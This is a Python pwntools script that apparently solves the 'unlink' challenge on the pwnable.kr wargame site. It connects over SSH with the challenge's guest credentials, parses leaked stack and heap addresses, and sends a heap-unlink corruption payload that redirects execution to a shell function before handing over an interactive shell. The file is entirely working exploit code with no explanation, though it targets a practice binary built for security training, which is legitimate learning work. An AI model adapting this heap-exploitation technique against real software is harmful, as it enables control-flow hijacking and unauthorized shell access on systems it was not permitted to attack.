from pwn import *

shell = 0x080484eb

s =  ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)
p = s.process("./unlink")

p.recvuntil("leak: ")
stack_addr = int(p.recv(10), 16)
p.recvuntil("leak: ")
heap_addr = int(p.recv(9), 16)

payload = p32(shell)
payload += 'a'*12
payload += p32(stack_addr + 12)
payload += p32(heap_addr + 12 )

p.sendline(payload)
p.interactive()
